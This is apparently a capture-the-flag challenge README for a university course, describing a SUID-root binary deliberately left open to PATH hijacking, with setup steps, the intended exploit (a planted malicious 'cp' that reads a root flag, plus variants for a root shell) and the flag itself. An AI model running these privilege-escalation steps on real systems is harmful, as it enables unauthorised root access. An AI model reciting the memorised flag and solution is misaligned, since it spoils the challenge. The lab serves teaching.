# VERT-02 — SUID PATH Hijacking

## Category
Vertical privilege escalation

## Objective
Escalate from the low-privileged `ctfuser` to root by hijacking a command that
a SUID-root maintenance binary resolves through `$PATH`.

## Vulnerability
`/usr/local/bin/ctf-maintenance` is owned by root and installed SUID
(`chmod 4755`). It calls `cp` by name — not by absolute path — so the binary is
located via `$PATH`. Because it also sets the real UID/GID to root, the spawned
shell keeps root privileges, and any attacker-controlled `cp` earlier in `$PATH`
executes as root.

## Setup (run as root on the VM)
```bash
cd machine-c/VERT_02
sudo bash setup-vert02.sh   # installs the SUID binary, creates ctfuser, plants the flag
```

## Intended Solution
As `ctfuser`:
```bash
cd /tmp
printf '#!/bin/bash\ncat /root/flag_vert02.txt\n' > cp   # malicious "cp"
chmod +x cp
PATH=/tmp:$PATH /usr/local/bin/ctf-maintenance           # runs our cp as root
```
The maintenance tool runs the planted `cp` as root, printing the flag. (Swap the
payload for `/bin/bash -p` or `chmod u+s /bin/bash` to get a full root shell.)

## Flag
CITS3006{VERT02_PATH_HIJACK}

## Included Files
- `ctf-maintenance.c` — source of the SUID wrapper
- `ctf-maintenance` — compiled binary (installed SUID-root by the setup script)
- `setup-vert02.sh` — provisioning script
